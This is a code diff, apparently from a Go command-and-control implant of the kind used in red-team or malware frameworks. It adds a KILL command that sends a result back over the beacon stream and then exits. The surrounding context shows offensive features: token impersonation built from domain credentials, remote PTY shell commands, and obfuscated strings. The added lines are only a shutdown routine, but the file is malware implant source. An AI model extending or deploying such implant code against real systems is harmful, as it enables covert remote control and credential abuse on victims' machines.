@@ -115,6 +115,12 @@ func (i *Implant) ExecuteTask(task *pb.Task) ([]byte, error) {
 		output, err = i.ListTokens()
 	case pb.CommandMessage_TOKEN_REVERT:
 		output, err = i.RevertToken()
+	case pb.CommandMessage_KILL:
+		output = []byte("Implant terminating")
+		go func() {
+			time.Sleep(100 * time.Millisecond)
+			os.Exit(0)
+		}()
 	// PTY commands require streaming mode
 	case pb.CommandMessage_PTY_START, pb.CommandMessage_PTY_STDIN, pb.CommandMessage_PTY_RESIZE, pb.CommandMessage_PTY_STOP:
 		err = fmt.Errorf("PTY commands require streaming mode")
@@ -343,6 +349,22 @@ func (i *Implant) ExecuteCommand(stream pb.C2Service_BeaconStreamClient, cmd *pb
 			password := cmd.Args[2]
 			output, err = i.MakeToken(domain, username, password)
 		}
+	case pb.CommandMessage_KILL:
+		output = []byte("Implant terminating")
+		// Send response before exiting
+		result := &pb.BeaconMessage{
+			ImplantId:    i.ID,
+			SessionToken: i.SessionToken,
+			Timestamp:    time.Now().Unix(),
+			Type:         pb.BeaconMessage_TASK_RESULT,
+			Payload:      []byte(fmt.Sprintf("%s|true|%s", cmd.CommandId, string(output))),
+		}
+		stream.Send(result)
+		go func() {
+			time.Sleep(100 * time.Millisecond)
+			os.Exit(0)
+		}()
+		return
 
 	default:
 		err = fmt.Errorf(deobfStr("unknown_cmd")+": %v", cmd.Type)
